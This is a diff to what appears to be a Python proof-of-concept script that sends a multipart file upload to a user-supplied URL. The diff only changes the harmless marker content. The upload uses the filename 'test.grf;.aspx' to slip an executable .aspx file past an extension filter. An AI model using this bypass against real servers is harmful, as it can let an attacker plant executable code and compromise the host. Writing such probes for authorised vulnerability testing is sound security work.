@@ -9,7 +9,7 @@ headers = {
         "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk"
     }
 
-data = '''------WebKitFormBoundaryxzUhGld6cusN3Alk\r\nContent-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\nContent-Type: application/octet-stream\r\n\r\n123456\r\n------WebKitFormBoundaryxzUhGld6cusN3Alk--'''
+data = '''------WebKitFormBoundaryxzUhGld6cusN3Alk\r\nContent-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\nContent-Type: application/octet-stream\r\n\r\n1234567\r\n------WebKitFormBoundaryxzUhGld6cusN3Alk--'''
 def main():
     parser = argparse.ArgumentParser(description='A script that uses argparse to handle command-line arguments.')
     parser.add_argument('-u', '--url', help='URL argument')
